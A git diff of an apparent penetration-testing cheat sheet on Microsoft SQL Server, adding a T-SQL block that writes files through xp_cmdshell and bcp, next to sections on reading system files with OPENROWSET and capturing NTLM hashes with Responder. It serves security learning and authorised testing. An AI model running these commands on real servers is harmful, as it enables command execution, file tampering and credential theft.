@@ -13,7 +13,7 @@ excerpt: "Technical understanding and practical overview"
 > Microsoft SQL Server is a relational database management system (RDBMS) developed by Microsoft, designed to manage and organize data in a structured way using tables that are related to each > other through defined relationships.
 > It allows applications and users to store, retrieve, update, and manage data efficiently using Transact-SQL (T-SQL), Microsoft’s implementation of the SQL language.
 
-[Payload all the thinks...](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
+[ Payload all the thinks ](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
 
 # Connecting to mssqlclient 
 ```bash
@@ -87,10 +87,29 @@ SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CL
 ```
 # Writing
 ## Writing files
-[More ways to write file]()
+
+[More ways to write file](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql)
 ```bash
 execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
 ```
+```bash
+-- Create a table to hold file content
+CREATE TABLE #FileContent (Line NVARCHAR(MAX));
+
+-- Insert the content you want to write
+INSERT INTO #FileContent (Line)
+VALUES ('This is a test file created via BULK INSERT method.');
+
+-- Export the table content to a file
+DECLARE @FilePath NVARCHAR(4000) = 'C:\Temp\output.txt';
+
+-- Use BCP via xp_cmdshell (requires xp_cmdshell enabled)
+EXEC xp_cmdshell 'bcp "SELECT Line FROM tempdb..#FileContent" queryout "C:\Temp\output.txt" -c -T -S localhost';
+
+-- Clean up
+DROP TABLE #FileContent;
+```
+
 ## PowerupSQL Writebulksert.sql
 [Resource link](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql#L15)
 ```bash
@@ -114,7 +133,7 @@ drop table #errortable
 ```
 
 # Capture NTLM Hash (LMNR Poisoning)
-This also called as the unc PathInjection.[PowerupSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/CheatSheet_UncPathInjection.txt)
+This also called as the unc PathInjection. [ PowerupSQL Cheatsheet 💀 ](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/CheatSheet_UncPathInjection.txt)
 ```bash
 responder -I tun0 -dvw
 
